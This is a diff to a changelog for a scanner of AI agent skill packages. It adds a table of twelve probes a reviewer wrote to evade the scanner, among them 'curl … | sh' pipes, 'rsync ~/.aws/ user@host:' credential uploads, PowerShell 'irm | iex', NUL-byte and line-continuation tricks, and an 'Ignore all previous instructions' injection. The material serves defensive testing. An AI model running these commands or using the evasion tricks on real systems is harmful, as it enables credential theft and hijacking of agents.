@@ -13,6 +13,7 @@ and `vercel-labs/agent-skills`, mirrored on 30 October 2026 (claude-plugins-offi
 | v0.1.1 (after an independent review) | 1 | 21 | 40 | 7 / 7 |
 | v0.1.2 (two false positives fixed) | 1 | 21 | 40 | 7 / 7 |
 | v0.1.3 (remote instructions rule) | 1 | 23 | 38 | 7 / 7 + 1 REVIEW fixture |
+| v0.1.4 (after a second independent review) | 1 | 24 | 37 | 7 / 7 + 11 / 12 review cases (1 REVIEW by design) |
 
 v0.1.0 shipped 5 fixtures: 4 malicious (`exfil`, `hidden`, `obfuscated`, `persistence`) and 1 clean.
 v0.1.1 added 3 malicious ones (`prose-pipe`, `split-exfil`, `name-injection`).
@@ -81,3 +82,38 @@ such as `command.md`). Fetching reference material (SDK READMEs, a course catalo
 LOW. On the 62 skills it flags exactly two, `web-design-guidelines` and `writing-guidelines`; twelve
 reference fetches are LOW. Calibration: 1 BLOCK, 23 REVIEW, 38 CLEAN/OK.
 
+## v0.1.4
+
+A second independent review wrote 12 inert malicious skills against v0.1.3. None got BLOCK:
+
+| # | Probe | v0.1.3 | v0.1.4 | Cause |
+|---|---|---|---|---|
+| 1 | five commented-out `curl … \| sh` lines, then a live one | REVIEW | BLOCK | the per-rule report cap ignored severity, so the live HIGH line was dropped |
+| 2 | script adds a `SessionStart` hook to `~/.claude/settings.json` | REVIEW | BLOCK | "skill" in the description counted as declaring config work |
+| 3 | NUL byte on line 2 of a bash script that uploads `~/.ssh` | REVIEW | BLOCK | treated as a binary and not scanned; bash runs it |
+| 4 | NUL byte in `SKILL.md` above injection and `curl \| bash` | REVIEW | BLOCK | same |
+| 5 | Python `"~/." + "ssh"` and `u = request.urlopen` | CLEAN | BLOCK | no import rule; path never written out |
+| 6 | Node `require("https")` with `~/.aws/credentials` | REVIEW | BLOCK | Node network modules not covered |
+| 7 | PowerShell `irm … \| iex`, lowercase `invoke-webrequest` | REVIEW | BLOCK | case-sensitive rules |
+| 8 | script padded past 2 MB | REVIEW | BLOCK | too large to scan was only MEDIUM |
+| 9 | `rsync ~/.aws/ user@host:` | REVIEW | BLOCK | rsync not a network tool |
+| 10 | `npx -y` with a typo-squatted package | OK | REVIEW | a typo can't be detected statically; installs in scripts are now MEDIUM |
+| 11 | a quoted paragraph in `SKILL.md` that starts "Ignore all previous instructions" | REVIEW | BLOCK | any quote counted as a mention |
+| 12 | `cu\` + newline + `rl … \| sh` | CLEAN | BLOCK | line continuations not joined |
+
+The v0.1.3 column is our own re-run of the probes; none got BLOCK. Each probe is now a case in
+`test_second_review_bypasses`, together with "run the use command with `--force`", which
+`airlock-override` missed; all 13 fail on v0.1.3.
+
+Effect on the 62 skills: one new REVIEW, `web-artifacts-builder`, whose setup script runs
+`npm install -g pnpm` and `pnpm install`. One change was rejected: making `.claude/commands/` and
+`.claude/agents/` HIGH without the "skill" excuse blocked both copies of Anthropic's `skill-creator`,
+which writes a temporary command file for its evals. Those directories are now a separate MEDIUM rule
+(`agent-instructions`), while settings, hooks and MCP config, which run code on their own, stay HIGH.
+`.claude/skills/` was left out of that rule because skills name their own install path constantly.
+Calibration: 1 BLOCK, 24 REVIEW, 37 CLEAN/OK.
+
+What this review shows beyond the twelve fixes: line-based patterns can always be evaded by code
+written against them (`getattr`, `chr()`, string building). The README now says so, and the v0.2
+roadmap makes skills with scripts from untrusted sources REVIEW at least, and adds optional
+sandboxed script runs.
